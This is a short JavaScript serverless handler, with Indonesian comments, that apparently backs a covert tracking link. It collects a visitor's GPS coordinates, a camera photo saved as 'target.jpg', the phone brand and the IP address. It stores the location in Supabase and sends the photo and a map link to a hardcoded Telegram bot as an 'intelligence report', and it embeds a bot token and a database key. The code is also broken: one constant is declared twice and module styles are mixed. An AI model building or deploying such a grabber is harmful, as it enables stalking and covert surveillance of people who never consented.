const axios = require('axios');
const FormData = require('form-data');
const { createClient } = require('@supabase/supabase-js');

// Masukkan URL dan Anon Key dari Project Supabase Anda di sini
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://idjfzymaywdimpfgkncq.supabase.co';
const supabaseKey = 'sb_publishable_OWuwBk7doR0laJLJG4IPsQ__cZgh0h7';
const supabase = createClient(supabaseUrl, supabaseKey);

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = '8341126680:AAFzJbyih79CWYbcj8ypSktqEecdh7Cf7Io';
    const chatId = '7710372176';

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ipAddress = rawIp.split(',')[0].trim();
    const userAgent = req.headers['user-agent'] || '';
    const { latitude, longitude, accuracy, image, deviceData } = req.body;

    // Deteksi Merek HP
    let deviceModel = 'Perangkat Tidak Diketahui';
    if (/iphone/i.test(userAgent)) deviceModel = 'Apple iPhone';
    else if (/samsung/i.test(userAgent)) deviceModel = 'Samsung Galaxy';
    else if (/xiaomi|mi|redmi|poco/i.test(userAgent)) deviceModel = 'Xiaomi / Redmi / Poco';
    else if (/oppo/i.test(userAgent)) deviceModel = 'Oppo';
    else if (/vivo/i.test(userAgent)) deviceModel = 'Vivo';
    else if (/realme/i.test(userAgent)) deviceModel = 'Realme';

    // 1. Simpan ke Database Supabase untuk Dashboard Real-time
   // 1. Simpan ke Database Supabase untuk Dashboard Real-time
    if (latitude && longitude) {
        const { error } = await supabase.from('locations').insert([
            { 
                latitude: parseFloat(latitude), 
                longitude: parseFloat(longitude), 
                accuracy: accuracy ? String(accuracy) : '-', 
                device_model: deviceModel 
            }
        ]);
        
        if (error) {
            // Ini akan memunculkan pesan error asli di layar HP/respon Anda
            return res.status(500).json({ status: 'error_supabase', message: error.message });
        }
    }

    // 2. Kirim Notifikasi & Foto ke Telegram
    try {
        const captionText = `🚨 **Laporan Intelijen & Perangkat**\n\n` +
                            `📱 **Merek HP:** ${deviceModel}\n` +
                            `📍 **Latitude:** ${latitude || 'N/A'}\n` +
                            `📍 **Longitude:** ${longitude || 'N/A'}\n` +
                            `🗺️ **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

        if (image) {
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'target.jpg', contentType: 'image/jpeg' });
            form.append('caption', captionText);
            form.append('parse_mode', 'Markdown');

            await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, { headers: form.getHeaders() });
        } else {
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                chat_id: chatId, text: captionText, parse_mode: 'Markdown'
            });
        }

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
